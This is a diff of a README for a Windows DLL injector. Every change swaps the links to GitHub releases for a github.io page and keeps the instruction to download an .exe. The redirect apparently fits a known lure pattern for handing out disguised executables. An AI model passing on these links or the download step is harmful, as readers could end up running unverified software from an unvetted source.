@@ -1,6 +1,6 @@
 # 📥 ExtremeInjector - The Most Trusted DLL Injector for Windows
 
-[![Download Latest Release](https://img.shields.io/badge/Download-ExtremeInjector%20v3.7.3-blue?style=for-the-badge&logo=github)](https://github.com/Yassinmuh9326/ExtremeInjector/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-ExtremeInjector%20v3.7.3-blue?style=for-the-badge&logo=github)](https://yassinmuh9326.github.io)
 
 ## 🎯 What is ExtremeInjector?
 
@@ -27,7 +27,7 @@ ExtremeInjector is a Windows tool that lets you inject DLL files into running pr
 
 ### How to Download
 
-1. Visit the [ExtremeInjector Releases Page](https://github.com/Yassinmuh9326/ExtremeInjector/releases)
+1. Visit the [ExtremeInjector Releases Page](https://yassinmuh9326.github.io)
 2. Find the latest version (ExtremeInjector v3.7.3)
 3. Download the file named `ExtremeInjector.exe`
 
@@ -139,7 +139,7 @@ Yes. You can add multiple DLL files to the list. ExtremeInjector will inject the
 
 ## 📥 Download Again
 
-[![Download ExtremeInjector v3.7.3](https://img.shields.io/badge/Download-ExtremeInjector-blue?style=for-the-badge&logo=github)](https://github.com/Yassinmuh9326/ExtremeInjector/releases)
+[![Download ExtremeInjector v3.7.3](https://img.shields.io/badge/Download-ExtremeInjector-blue?style=for-the-badge&logo=github)](https://yassinmuh9326.github.io)
 
 ## 🔑 Keywords
 
